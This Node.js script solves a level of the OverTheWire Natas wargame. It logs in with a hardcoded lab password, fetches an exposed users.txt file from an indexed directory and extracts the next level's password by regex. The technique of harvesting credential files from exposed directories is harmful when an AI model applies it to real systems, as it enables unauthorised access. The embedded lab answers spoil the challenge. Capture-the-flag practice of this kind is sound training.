#!/usr/bin/env node

const axios = require('axios');
const cheerio = require('cheerio');

const username = 'natas2';
const password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi';

const url = `http://${username}.natas.labs.overthewire.org`;

// The password is in the user.txt file in the files directory and the file indexing is on.
let newUrl = `${url}/files/users.txt`;
axios.get(newUrl, { auth: { username: username, password: password } }).then(res => {
    const $ = cheerio.load(res.data);
    const re = /natas3:(.\w+)/;
    let password = $.html().match(re)[1];
    console.log(`Password: ${password}`);
}
);
